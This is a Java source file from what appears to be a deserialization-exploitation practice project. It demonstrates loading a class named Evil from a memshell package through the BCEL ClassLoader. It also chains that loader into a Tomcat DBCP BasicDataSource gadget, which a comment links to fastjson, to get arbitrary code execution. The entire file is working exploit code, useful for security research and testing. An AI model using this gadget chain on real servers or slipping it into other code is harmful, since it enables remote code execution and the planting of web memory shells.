package xyz.eki.marshalexp.solution;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import xyz.eki.marshalexp.memshell.Evil;
import xyz.eki.marshalexp.utils.MiscUtils;

import java.io.IOException;

public class BCELClz {

    public static void test1() throws Exception{
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String code = Utility.encode(javaClass.getBytes(),true);

        System.out.println("BCEL Codes:"+code);
        new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass("$$BCEL$$"+code).newInstance();
    }

    //getConnection()->createDataSource()->createConnectionFactory() fastjson
    public static void test2() throws Exception{
        org.apache.tomcat.dbcp.dbcp2.BasicDataSource  dataSource = new org.apache.tomcat.dbcp.dbcp2.BasicDataSource();
        dataSource.setDriverClassLoader(new com.sun.org.apache.bcel.internal.util.ClassLoader());
        dataSource.setDriverClassName(MiscUtils.dumpBCELClass(Evil.class));
        dataSource.getConnection();
    }

    public static void test3() throws Exception{

    }

    public static void main(String[] args) throws Exception {
        test2();
    }
}
